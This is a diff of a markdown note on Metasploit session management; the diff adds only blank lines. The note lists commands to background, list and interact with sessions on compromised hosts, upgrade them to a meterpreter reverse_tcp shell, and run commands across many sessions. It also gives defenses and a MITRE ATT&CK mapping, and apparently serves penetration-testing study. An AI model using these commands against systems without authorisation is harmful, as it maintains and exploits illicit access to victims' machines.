@@ -43,11 +43,15 @@ From a technical standpoint, session management with Metasploit involves using t
 
 The business value of session management with Metasploit is its ability to maintain access to a compromised system, which can lead to further exploitation and data theft.
 
+ 
+
 ## Requirements
 
 1. Valid credentials or a vulnerability to exploit
 
 1. Access to the target network
+
+ 
 
 ## Defense
 
@@ -57,6 +61,8 @@ The business value of session management with Metasploit is its ability to maint
 
 1. Regularly update and patch systems to reduce the risk of vulnerabilities being exploited
 
+ 
+
 ## Objectives
 
 1. Maintain access to a compromised system
@@ -65,14 +71,24 @@ The business value of session management with Metasploit is its ability to maint
 
 1. Upload and download files from the target system
 
+ 
+
 # Instructions
 
 1. To manage sessions, use the 'sessions' command followed by the appropriate option. Use 'CTRL+Z' to put the current session in the background. Use 'sessions' to list all available sessions. Use 'sessions -i session_number' to interact with a specific session. Use 'sessions -u session_number' to upgrade the session to a meterpreter. Use 'sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false' to upgrade the session to a meterpreter with custom options. Use 'sessions -c cmd' to execute a command on multiple sessions. Use 'sessions -i 10-20 -c "id"' to execute a command on a range of sessions.
 
+ 
+
+
+
 **Code**: [[CTRL+Z   -> Session in Background
 sessions -> List]]
 
+
+
 > The 'sessions' command is used to manage sessions in Meterpreter. These sessions represent active connections to a target system. The 'CTRL+Z' key combination is used to put the current session in the background. The 'sessions' command without any options will list all available sessions. The '-i' option followed by a session number is used to interact with a specific session. The '-u' option followed by a session number is used to upgrade the session to a meterpreter. The '-u' option can also be used with custom options such as 'LPORT=4444' and 'PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false'. The '-c' option followed by a command is used to execute a command on multiple sessions. The '-i' option followed by a range of session numbers and the '-c' option followed by a command is used to execute a command on a range of sessions.
+
+
 
 **Command** ([[Session in Background]]):
 
@@ -80,11 +96,19 @@ sessions -> List]]
 CTRL+Z
 ```
 
+
+
+
+
 **Command** ([[List all available sessions]]):
 
 ```bash
 sessions
 ```
+
+
+
+
 
 **Command** ([[Interact with a specific session]]):
 
@@ -92,11 +116,19 @@ sessions
 sessions -i session_number
 ```
 
+
+
+
+
 **Command** ([[Upgrade session to a meterpreter]]):
 
 ```bash
 sessions -u session_number
 ```
+
+
+
+
 
 **Command** ([[Upgrade session to a meterpreter with custom options]]):
 
@@ -104,17 +136,27 @@ sessions -u session_number
 sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false
 ```
 
+
+
+
+
 **Command** ([[Execute a command on multiple sessions]]):
 
 ```bash
 sessions -c cmd
 ```
 
+
+
+
+
 **Command** ([[Execute a command on a range of sessions]]):
 
 ```bash
 sessions -i 10-20 -c "id"
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -146,3 +188,5 @@ sessions -i 10-20 -c "id"
 
 - [[Metasploit]]
 - [[Sessions]]
+
+
